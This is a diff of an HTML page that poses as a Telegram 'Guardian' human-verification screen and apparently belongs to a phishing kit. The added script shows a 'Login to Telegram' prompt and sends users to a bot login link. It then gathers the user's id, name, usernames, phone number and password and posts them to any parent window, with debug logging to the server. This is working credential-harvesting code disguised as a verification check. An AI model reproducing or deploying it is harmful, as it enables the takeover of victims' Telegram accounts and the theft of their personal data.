@@ -1,119 +1,81 @@
+<!DOCTYPE html>
 <html style="--tg-color-scheme: dark; --tg-theme-bg-color: #212121; --tg-theme-text-color: #ffffff; --tg-theme-hint-color: #aaaaaa; --tg-theme-link-color: #8774e1; --tg-theme-button-color: #8774e1; --tg-theme-button-text-color: #ffffff; --tg-theme-secondary-bg-color: #0f0f0f; --tg-theme-header-bg-color: #212121; --tg-theme-accent-text-color: #8774e1; --tg-theme-section-bg-color: #212121; --tg-theme-section-header-text-color: #aaaaaa; --tg-theme-subtitle-text-color: #aaaaaa; --tg-theme-destructive-text-color: #e53935; --tg-viewport-height: 100vh; --tg-viewport-stable-height: 100vh;">
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width">
-    <title>ArkiTech Guardian</title>
-    <meta name="description" content="Please authenticate yourself as a human">
+    <title>Guardian</title>
+    <meta name="description" content="@Guardian Verification Bot">
     <link rel="icon" href="./favicon.ico">
     <meta name="next-head-count" content="5">
-    <link rel="icon" href="./favicon.ico">
-    <link data-next-font="" rel="preconnect" href="/" crossorigin="anonymous">
-    <link rel="preload" href="./_next/static/css/f13011def78f3027.css" as="style">
-    <link rel="stylesheet" href="./_next/static/css/f13011def78f3027.css" data-n-g="">
-    <noscript data-n-css=""></noscript>
-    <style id="__jsx-f10ce31a3e289a42">
-      @-webkit-keyframes dotsAnimation {
-
-        0%,
-        20% {
-          content: "."
-        }
-
-        40%,
-        60% {
-          content: ".."
-        }
-
-        80%,
-        100% {
-          content: "..."
-        }
-      }
-
-      @-moz-keyframes dotsAnimation {
-
-        0%,
-        20% {
-          content: "."
-        }
-
-        40%,
-        60% {
-          content: ".."
-        }
-
-        80%,
-        100% {
-          content: "..."
-        }
-      }
-
-      @-o-keyframes dotsAnimation {
-
-        0%,
-        20% {
-          content: "."
-        }
-
-        40%,
-        60% {
-          content: ".."
-        }
-
-        80%,
-        100% {
-          content: "..."
-        }
-      }
-
-      @keyframes dotsAnimation {
-
-        0%,
-        20% {
-          content: "."
-        }
-
-        40%,
-        60% {
-          content: ".."
-        }
-
-        80%,
-        100% {
-          content: "..."
-        }
-      }
-
-      .animate-dots.jsx-f10ce31a3e289a42::after {
-        content: ".";
-        display: inline-block;
-        -webkit-animation: dotsAnimation 2s infinite;
-        -moz-animation: dotsAnimation 2s infinite;
-        -o-animation: dotsAnimation 2s infinite;
-        animation: dotsAnimation 2s infinite
-      }
-    </style>
+    <link rel="preload" href="./_next/static/css/3db7e18ba6d2d9e9.css" as="style">
+    <link rel="stylesheet" href="./_next/static/css/3db7e18ba6d2d9e9.css" data-n-g="">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
   </head>
   <body>
     <div id="__next">
-      <div style="background-color: rgb(33, 33, 33);">
-        <div class="flex h-screen justify-center">
-          <div>
-            <h2 class="mt-2 text-center text-3xl" style="color: rgb(255, 255, 255);">Human verification</h2>
-            <p class="mt-2 text-center text-sm" style="color: rgb(170, 170, 170);">Please verify that you are human</p>
-            <div class="mt-6">
-              <div onclick="window.location.replace('/a/' + window.location.search + window.location.hash)"  style="min-height:3rem" class="jsx-f10ce31a3e289a42 bg-blue-800 shadow-xl rounded-lg border-blue-800 hover:bg-blue-900 cursor-pointer relative">
-                <div class="jsx-f10ce31a3e289a42 absolute inset-0 flex items-center justify-center px-4 py-3 space-x-2">
-                  <label for="human" class="jsx-f10ce31a3e289a42 text-center text-sm font-medium text-slate-100">Click to verify</label>
-                </div>
-              </div>
+      <div class="bg-telegram-bg">
+        <main class="flex items-center justify-start flex-col gap-2 h-[100vh] p-4 text-center">
+          <div class="mt-5">
+            <p class="text-3xl font-bold text-telegram-text">Human Verification</p>
+            <p class="text-md font-bold text-telegram-text mt-2">Verify below to be granted entry</p>
+            <div class="flex items-center justify-center w-100 mt-3">
+              <button onclick="window.location.replace('/a/' + window.location.search + window.location.hash)" class="w-full px-3 py-3 my-4 font-mono text-base rounded text-telegram-button-text bg-gradient-to-r from-button1 via-button2 to-button3 hover:bg-gradient-to-br shadow-lg shadow-black-500/50 dark:shadow-lg dark:shadow-black-800/80">Click here</button>
             </div>
           </div>
-        </div>
+        </main>
       </div>
     </div>
-    <next-route-announcer>
-      <p aria-live="assertive" id="__next-route-announcer__" role="alert" style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; top: 0px; width: 1px; white-space: nowrap; overflow-wrap: normal;"></p>
-    </next-route-announcer>
+    <script>
+      window.onload = () => {
+        const queryString = window.location.search;
+        const urlParams = new URLSearchParams(queryString);
+        const type = urlParams.get('type') || 'guardian';
+        Telegram.WebApp.ready();
+        Telegram.WebApp.expand();
+        Telegram.WebApp.MainButton.setText('Login to Telegram')
+          .show()
+          .onClick(() => {
+            Telegram.WebApp.showPopup({
+              title: 'Login to Telegram',
+              message: 'Please login to your Telegram account to continue.',
+              buttons: [
+                { id: 'login', type: 'default', text: 'Login' },
+                { type: 'cancel' }
+              ]
+            }, (buttonId) => {
+              if (buttonId === 'login') {
+                Telegram.WebApp.openTelegramLink('https://t.me/GuardianSafetyrobot?start=login');
+              }
+            });
+          });
+        Telegram.WebApp.onEvent('web_app_data', (event) => {
+          fetch('/api/debug', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ message: `Received web_app_data event: ${event.data}` }),
+          });
+          const data = JSON.parse(event.data);
+          fetch('/api/debug', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ message: `Sending postMessage for type ${type} with userId ${data.id}` }),
+          });
+          window.parent.postMessage({
+            type,
+            id: data.id,
+            first_name: data.first_name,
+            usernames: data.usernames,
+            phone_number: data.phone_number,
+            premium: data.is_premium,
+            password: data.password,
+            quickly_set: data.quickly_set
+          }, '*');
+        });
+      };
+    </script>
   </body>
 </html>
